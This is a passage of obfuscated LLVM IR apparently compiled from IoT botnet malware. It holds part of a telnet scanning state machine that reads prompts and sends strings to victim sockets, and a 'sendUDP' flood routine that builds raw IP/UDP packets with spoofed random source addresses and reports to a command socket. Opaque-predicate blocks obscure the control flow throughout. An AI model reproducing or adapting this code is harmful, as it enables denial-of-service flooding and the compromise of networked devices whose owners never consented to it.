  %3207 = load i32, i32* %10, align 4
  %3208 = sext i32 %3207 to i64
  %3209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3208
  %3210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3209, i32 0, i32 0
  %3211 = load i32, i32* %3210, align 16
  %3212 = call i32 @sclose(i32 %3211)
  %3213 = load i32, i32* %10, align 4
  %3214 = sext i32 %3213 to i64
  %3215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3214
  %3216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3215, i32 0, i32 2
  store i8 0, i8* %3216, align 8
  %3217 = load i32, i32* %10, align 4
  %3218 = sext i32 %3217 to i64
  %3219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3218
  %3220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3219, i32 0, i32 3
  store i8 0, i8* %3220, align 1
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1887
  %3221 = load i32, i32* %10, align 4
  %3222 = sext i32 %3221 to i64
  %3223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3222
  %3224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3223, i32 0, i32 2
  store i8 7, i8* %3224, align 8
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1949
  %3225 = load i32, i32* %10, align 4
  %3226 = sext i32 %3225 to i64
  %3227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3226
  %3228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3227, i32 0, i32 8
  %3229 = load i8*, i8** %3228, align 8
  call void @llvm.memset.p0i8.i64(i8* %3229, i8 0, i64 1024, i32 1, i1 false)
  %3230 = load i32, i32* %10, align 4
  %3231 = sext i32 %3230 to i64
  %3232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3231
  %3233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3232, i32 0, i32 0
  %3234 = load i32, i32* %3233, align 16
  %3235 = call i32 @sclose(i32 %3234)
  %3236 = load i32, i32* %10, align 4
  %3237 = sext i32 %3236 to i64
  %3238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3237
  %3239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3238, i32 0, i32 2
  store i8 0, i8* %3239, align 8
  %3240 = load i32, i32* %10, align 4
  %3241 = sext i32 %3240 to i64
  %3242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3241
  %3243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3242, i32 0, i32 3
  store i8 0, i8* %3243, align 1
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %2087
  %3244 = load i32, i32* %10, align 4
  %3245 = sext i32 %3244 to i64
  %3246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3245
  %3247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3246, i32 0, i32 8
  %3248 = load i8*, i8** %3247, align 8
  call void @llvm.memset.p0i8.i64(i8* %3248, i8 0, i64 1024, i32 1, i1 false)
  %3249 = load i32, i32* %10, align 4
  %3250 = sext i32 %3249 to i64
  %3251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3250
  %3252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3251, i32 0, i32 0
  %3253 = load i32, i32* %3252, align 16
  %3254 = call i32 @sclose(i32 %3253)
  %3255 = load i32, i32* %10, align 4
  %3256 = sext i32 %3255 to i64
  %3257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3256
  %3258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3257, i32 0, i32 2
  store i8 0, i8* %3258, align 8
  %3259 = load i32, i32* %10, align 4
  %3260 = sext i32 %3259 to i64
  %3261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3260
  %3262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3261, i32 0, i32 3
  store i8 1, i8* %3262, align 1
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %2123
  %3263 = load i32, i32* %10, align 4
  %3264 = sext i32 %3263 to i64
  %3265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3264
  %3266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3265, i32 0, i32 2
  store i8 7, i8* %3266, align 8
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %2185
  %3267 = load i32, i32* %10, align 4
  %3268 = sext i32 %3267 to i64
  %3269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3268
  %3270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3269, i32 0, i32 8
  %3271 = load i8*, i8** %3270, align 8
  call void @llvm.memset.p0i8.i64(i8* %3271, i8 0, i64 1024, i32 1, i1 false)
  %3272 = load i32, i32* %10, align 4
  %3273 = sext i32 %3272 to i64
  %3274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3273
  %3275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3274, i32 0, i32 0
  %3276 = load i32, i32* %3275, align 16
  %3277 = call i32 @sclose(i32 %3276)
  %3278 = load i32, i32* %10, align 4
  %3279 = sext i32 %3278 to i64
  %3280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3279
  %3281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3280, i32 0, i32 2
  store i8 0, i8* %3281, align 8
  %3282 = load i32, i32* %10, align 4
  %3283 = sext i32 %3282 to i64
  %3284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3283
  %3285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3284, i32 0, i32 3
  store i8 0, i8* %3285, align 1
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %2260
  %3286 = load i32, i32* %10, align 4
  %3287 = sext i32 %3286 to i64
  %3288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3287
  %3289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3288, i32 0, i32 0
  %3290 = load i32, i32* %3289, align 16
  %3291 = load i32, i32* %10, align 4
  %3292 = sext i32 %3291 to i64
  %3293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3292
  %3294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3293, i32 0, i32 8
  %3295 = load i8*, i8** %3294, align 8
  %3296 = load i32, i32* %10, align 4
  %3297 = sext i32 %3296 to i64
  %3298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3297
  %3299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3298, i32 0, i32 7
  %3300 = load i16, i16* %3299, align 16
  %3301 = zext i16 %3300 to i32
  %3302 = call i32 @readUntil(i32 %3290, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3295, i32 1024, i32 %3301)
  %3303 = icmp ne i32 %3302, 0
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %2364
  %3304 = load i32, i32* %10, align 4
  %3305 = sext i32 %3304 to i64
  %3306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3305
  %3307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3306, i32 0, i32 8
  %3308 = load i8*, i8** %3307, align 8
  call void @llvm.memset.p0i8.i64(i8* %3308, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %2405
  %3309 = load i32, i32* %10, align 4
  %3310 = sext i32 %3309 to i64
  %3311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3310
  %3312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3311, i32 0, i32 6
  store i32 0, i32* %3312, align 4
  %3313 = load i32, i32* %10, align 4
  %3314 = sext i32 %3313 to i64
  %3315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3314
  %3316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3315, i32 0, i32 7
  store i16 0, i16* %3316, align 16
  %3317 = load i32, i32* %10, align 4
  %3318 = sext i32 %3317 to i64
  %3319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3318
  %3320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3319, i32 0, i32 8
  %3321 = load i8*, i8** %3320, align 8
  %3322 = call i8* @strstr(i8* %3321, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %3323 = icmp ne i8* %3322, null
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %2485
  %3324 = load i32, i32* %10, align 4
  %3325 = sext i32 %3324 to i64
  %3326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3325
  %3327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3326, i32 0, i32 2
  store i8 7, i8* %3327, align 8
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %2506
  %3328 = load i32, i32* %10, align 4
  %3329 = sext i32 %3328 to i64
  %3330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3329
  %3331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3330, i32 0, i32 8
  %3332 = load i8*, i8** %3331, align 8
  call void @llvm.memset.p0i8.i64(i8* %3332, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %2528
  %3333 = load i32, i32* %10, align 4
  %3334 = sext i32 %3333 to i64
  %3335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3334
  %3336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3335, i32 0, i32 8
  %3337 = load i8*, i8** %3336, align 8
  %3338 = call i64 @strlen(i8* %3337) #10
  %3339 = trunc i64 %3338 to i16
  %3340 = load i32, i32* %10, align 4
  %3341 = sext i32 %3340 to i64
  %3342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3341
  %3343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3342, i32 0, i32 7
  store i16 %3339, i16* %3343, align 16
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %2557
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %2578
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %2595
  %3344 = load i32, i32* %10, align 4
  %3345 = sext i32 %3344 to i64
  %3346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3345
  %3347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3346, i32 0, i32 6
  %3348 = load i32, i32* %3347, align 4
  %_235 = shl i32 %3348, 10
  %_236 = sub i32 %3348, 10
  %gen237 = mul i32 %_236, 10
  %_238 = shl i32 %3348, 10
  %_239 = sub i32 %3348, 10
  %gen240 = mul i32 %_239, 10
  %_241 = sub i32 %3348, 10
  %gen242 = mul i32 %_241, 10
  %_243 = sub i32 %3348, 10
  %gen244 = mul i32 %_243, 10
  %3349 = add i32 %3348, 10
  %3350 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %3351 = icmp ult i32 %3349, %3350
  br label %originalBB234

originalBB248alteredBB:                           ; preds = %originalBB248, %2620
  %3352 = load i32, i32* %10, align 4
  %3353 = sext i32 %3352 to i64
  %3354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3353
  %3355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3354, i32 0, i32 0
  %3356 = load i32, i32* %3355, align 16
  %3357 = call i32 @sclose(i32 %3356)
  %3358 = load i32, i32* %10, align 4
  %3359 = sext i32 %3358 to i64
  %3360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3359
  %3361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3360, i32 0, i32 2
  store i8 0, i8* %3361, align 8
  %3362 = load i32, i32* %10, align 4
  %3363 = sext i32 %3362 to i64
  %3364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3363
  %3365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3364, i32 0, i32 3
  store i8 1, i8* %3365, align 1
  br label %originalBB248

originalBB252alteredBB:                           ; preds = %originalBB252, %2652
  %3366 = load i32, i32* %10, align 4
  %3367 = sext i32 %3366 to i64
  %3368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3367
  %3369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3368, i32 0, i32 0
  %3370 = load i32, i32* %3369, align 16
  %3371 = call i64 @send(i32 %3370, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %3372 = icmp slt i64 %3371, 0
  br label %originalBB252

originalBB256alteredBB:                           ; preds = %originalBB256, %2696
  %3373 = load i32, i32* %10, align 4
  %3374 = sext i32 %3373 to i64
  %3375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3374
  %3376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3375, i32 0, i32 0
  %3377 = load i32, i32* %3376, align 16
  %3378 = call i64 @send(i32 %3377, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i32 0, i32 0), i64 9, i32 16384)
  %3379 = icmp slt i64 %3378, 0
  br label %originalBB256

originalBB261alteredBB:                           ; preds = %originalBB261, %2740
  %3380 = load i32, i32* %10, align 4
  %3381 = sext i32 %3380 to i64
  %3382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3381
  %3383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3382, i32 0, i32 6
  %3384 = load i32, i32* %3383, align 4
  %3385 = icmp eq i32 %3384, 0
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %2769
  %3386 = load i32, i32* %10, align 4
  %3387 = sext i32 %3386 to i64
  %3388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3387
  %3389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3388, i32 0, i32 0
  %3390 = load i32, i32* %3389, align 16
  %3391 = call i64 @send(i32 %3390, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i32 0, i32 0), i64 194, i32 16384)
  %3392 = icmp slt i64 %3391, 0
  br label %originalBB265
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %445

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %168

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @x.67
  %54 = load i32, i32* @y.68
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %52
  %61 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %61, i32* %15, align 4
  %62 = load i32, i32* %15, align 4
  %63 = icmp ne i32 %62, 0
  %64 = load i32, i32* @x.67
  %65 = load i32, i32* @y.68
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %63, label %91, label %72

; <label>:72:                                     ; preds = %originalBBpart2
  %73 = load i32, i32* @x.67
  %74 = load i32, i32* @y.68
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  %83 = load i32, i32* @x.67
  %84 = load i32, i32* @y.68
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %445

; <label>:91:                                     ; preds = %originalBBpart2
  %92 = load i32, i32* @x.67
  %93 = load i32, i32* @y.68
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 1
  %102 = sext i32 %101 to i64
  %103 = call noalias i8* @malloc(i64 %102) #2
  store i8* %103, i8** %16, align 8
  %104 = load i8*, i8** %16, align 8
  %105 = icmp eq i8* %104, null
  %106 = load i32, i32* @x.67
  %107 = load i32, i32* @y.68
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br i1 %105, label %114, label %115

; <label>:114:                                    ; preds = %originalBBpart211
  br label %445

; <label>:115:                                    ; preds = %originalBBpart211
  %116 = load i8*, i8** %16, align 8
  %117 = load i32, i32* %11, align 4
  %118 = add nsw i32 %117, 1
  %119 = sext i32 %118 to i64
  call void @llvm.memset.p0i8.i64(i8* %116, i8 0, i64 %119, i32 1, i1 false)
  %120 = load i8*, i8** %16, align 8
  %121 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %120, i32 %121)
  %122 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %123 = load i32, i32* %9, align 4
  %124 = add nsw i32 %122, %123
  store i32 %124, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %125

; <label>:125:                                    ; preds = %164, %163, %115
  %126 = load i32, i32* @x.67
  %127 = load i32, i32* @y.68
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %125
  %134 = load i32, i32* %15, align 4
  %135 = load i8*, i8** %16, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %139 = call i64 @sendto(i32 %134, i8* %135, i64 %137, i32 0, %struct.sockaddr* %138, i32 16)
  %140 = load i32, i32* %18, align 4
  %141 = load i32, i32* %14, align 4
  %142 = icmp eq i32 %140, %141
  %143 = load i32, i32* @x.67
  %144 = load i32, i32* @y.68
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %142, label %151, label %164

; <label>:151:                                    ; preds = %originalBBpart215
  %152 = load i32, i32* %8, align 4
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %158

; <label>:154:                                    ; preds = %151
  %155 = call i32 @rand_cmwc()
  %156 = trunc i32 %155 to i16
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %156, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %154, %151
  %159 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %160 = load i32, i32* %17, align 4
  %161 = icmp sgt i32 %159, %160
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158
  br label %167

; <label>:163:                                    ; preds = %158
  store i32 0, i32* %18, align 4
  br label %125

; <label>:164:                                    ; preds = %originalBBpart215
  %165 = load i32, i32* %18, align 4
  %166 = add i32 %165, 1
  store i32 %166, i32* %18, align 4
  br label %125

; <label>:167:                                    ; preds = %162
  br label %445

; <label>:168:                                    ; preds = %46
  %169 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %169, i32* %19, align 4
  %170 = load i32, i32* %19, align 4
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %191, label %172

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* @x.67
  %174 = load i32, i32* @y.68
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %172
  %181 = load i32, i32* @mainCommSock, align 4
  %182 = call i32 (i32, i8*, ...) @sockprintf(i32 %181, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  %183 = load i32, i32* @x.67
  %184 = load i32, i32* @y.68
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %445

; <label>:191:                                    ; preds = %168
  %192 = load i32, i32* @x.67
  %193 = load i32, i32* @y.68
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %191
  store i32 1, i32* %20, align 4
  %200 = load i32, i32* %19, align 4
  %201 = bitcast i32* %20 to i8*
  %202 = call i32 @setsockopt(i32 %200, i32 0, i32 3, i8* %201, i32 4) #2
  %203 = icmp slt i32 %202, 0
  %204 = load i32, i32* @x.67
  %205 = load i32, i32* @y.68
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %203, label %212, label %231

; <label>:212:                                    ; preds = %originalBBpart223
  %213 = load i32, i32* @x.67
  %214 = load i32, i32* @y.68
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %212
  %221 = load i32, i32* @mainCommSock, align 4
  %222 = call i32 (i32, i8*, ...) @sockprintf(i32 %221, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  %223 = load i32, i32* @x.67
  %224 = load i32, i32* @y.68
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %445

; <label>:231:                                    ; preds = %originalBBpart223
  store i32 50, i32* %21, align 4
  br label %232

; <label>:232:                                    ; preds = %236, %231
  %233 = load i32, i32* %21, align 4
  %234 = add nsw i32 %233, -1
  store i32 %234, i32* %21, align 4
  %235 = icmp ne i32 %233, 0
  br i1 %235, label %236, label %241

; <label>:236:                                    ; preds = %232
  %237 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %238 = call i32 @rand_cmwc()
  %239 = xor i32 %237, %238
  call void @srand(i32 %239) #2
  %240 = call i32 @rand() #2
  call void @init_rand(i32 %240)
  br label %232

; <label>:241:                                    ; preds = %232
  %242 = load i32, i32* %10, align 4
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %245

; <label>:244:                                    ; preds = %241
  store i32 0, i32* %22, align 4
  br label %251

; <label>:245:                                    ; preds = %241
  %246 = load i32, i32* %10, align 4
  %247 = sub nsw i32 32, %246
  %248 = shl i32 1, %247
  %249 = sub nsw i32 %248, 1
  %250 = xor i32 %249, -1
  store i32 %250, i32* %22, align 4
  br label %251

; <label>:251:                                    ; preds = %245, %244
  %252 = load i32, i32* %11, align 4
  %253 = sext i32 %252 to i64
  %254 = add i64 28, %253
  %255 = call i8* @llvm.stacksave()
  store i8* %255, i8** %23, align 8
  %256 = alloca i8, i64 %254, align 16
  %257 = bitcast i8* %256 to %struct.iphdr*
  store %struct.iphdr* %257, %struct.iphdr** %24, align 8
  %258 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %259 = bitcast %struct.iphdr* %258 to i8*
  %260 = getelementptr i8, i8* %259, i64 20
  %261 = bitcast i8* %260 to %struct.udphdr*
  store %struct.udphdr* %261, %struct.udphdr** %25, align 8
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %264 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 4
  %266 = load i32, i32* %22, align 4
  %267 = call i32 @getRandomIP(i32 %266)
  %268 = call i32 @htonl(i32 %267) #13
  %269 = load i32, i32* %11, align 4
  %270 = sext i32 %269 to i64
  %271 = add i64 8, %270
  %272 = trunc i64 %271 to i32
  call void @makeIPPacket(%struct.iphdr* %262, i32 %265, i32 %268, i8 zeroext 17, i32 %272)
  %273 = load i32, i32* %11, align 4
  %274 = sext i32 %273 to i64
  %275 = add i64 8, %274
  %276 = trunc i64 %275 to i16
  %277 = call zeroext i16 @htons(i16 zeroext %276) #13
  %278 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i32 0, i32 0
